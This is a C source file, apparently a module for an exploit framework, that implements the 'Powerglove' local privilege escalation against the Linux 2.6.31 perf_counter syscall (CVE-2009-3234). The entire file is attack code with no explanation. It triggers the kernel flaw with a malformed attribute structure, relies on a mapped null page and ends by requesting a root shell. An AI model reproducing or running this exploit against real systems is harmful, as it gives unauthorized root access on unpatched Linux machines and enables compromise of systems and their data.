/* powerglove */
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include "exp_framework.h"

#undef __NR_perf_counter_open
#ifdef __x86_64__
#define __NR_perf_counter_open 298
#else
#define __NR_perf_counter_open 336
#endif

struct perf_counter_attr {
	unsigned int type;
	unsigned int size;
};

struct exploit_state *exp_state;

char *desc = "Powerglove: Linux 2.6.31 perf_counter local root";
char *cve = "CVE-2009-3234";

int get_exploit_state_ptr(struct exploit_state *ptr)
{
	exp_state = ptr;
	return 0;
}

int requires_null_page = 1;

int prepare(unsigned char *ptr)
{
	return EXIT_KERNEL_TO_NULL;
}

int trigger(void)
{
	struct perf_counter_attr *ctr;

	ctr = (struct perf_counter_attr *)calloc(1, 0x1000);
	if (ctr == NULL) {
		fprintf(stdout, "bleh\n");
		exit(1);
	}

#ifdef __x86_64__
	ctr->size = 0xd0;
#else
	ctr->size = 0x60;
#endif
	
	syscall(__NR_perf_counter_open, ctr, getpid(), 0, 0, 0UL);

	return 0;
}

int post(void)
{
	return RUN_ROOTSHELL;
}
